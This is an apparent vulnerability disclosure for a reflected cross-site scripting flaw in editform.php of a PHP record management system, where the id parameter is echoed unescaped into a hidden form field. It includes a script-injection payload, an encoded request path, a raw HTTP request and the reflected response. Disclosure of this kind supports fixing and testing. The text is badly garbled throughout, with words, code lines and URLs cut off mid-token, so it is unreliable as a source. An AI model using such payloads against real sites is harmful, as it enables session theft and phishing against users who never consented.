
---
Reflected XSS Vulnerability in editform.php of the Record Management System

The transaction editing function of the Record Management System is handled by editform.php. When a user opens the edit page, the backend reads the id parameter from the URL. In the code, editform.php:3 directly reads this parameter, and editform.php:10 concatenates it into the HTML hidden input value attribute without any output encoding:

$id=$_GET['id'];
...
<form action="edit.php" me
<input type="hidden" name="memids" value="<?php echo $id; ?>" />              
Because the application does not perform HTML escaping or output sanitization, an attacker can inject malough the id parameter,resulting in a reflected Cross-Site Scripting (XSS) vulnerability.            
This endpoint is linked from the transaction list (main/index.php:120 renders <a rel="facebox" href="edirow['id']; ?>"> Edit </a>for every record), and it requires no authentication — the application performs zero session checo the page is reachable byany visitor.

Impact of the Reflected XSS Vulnerability

An attacker can exploit this vulnerability to execute arbitrary JavaScript in
the victim's browser withiently opened page. This may lead to session theft, sensitive data disclosure, page content manipulation,
phishing, or unauthorized lf of the victim.

Payload

Injection parameter: id

Injected value:

1"><sCrIpT>alert(9999)</sC

Request method: GET

Request path:

/main/editform.php?id=1%22)%3C%2FsCrIpT%3E

Raw request:

GET /main/editform.php?id=9999)%3C%2FsCrIpT%3EHTTP/1.1
Host: localhost:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (M10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,applicat/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;
Cookie: PHPSESSID=74c2f8c3a5a4bfb15b0dbd4a09cb98e8
Connection: keep-alive
                                                                        Reflected response snippet
                                                                        <form action="edit.php" me
<input type="hidden" name="memids" value="1"><sCrIpT>alert(9999)</sCrIpT
The response shows that the injected payload is reflected into the HTML attribute without encodingwser to parse and executethe attacker-controlled script.

Sources Download                                                    
- [Record Management System in PHP With Source Code - Source Code & Projects](https://code-pront-system-in-php/)

image-20260604115005785 (hent.com/zzzxc643/images/main/image/image-20260604115005785.png)
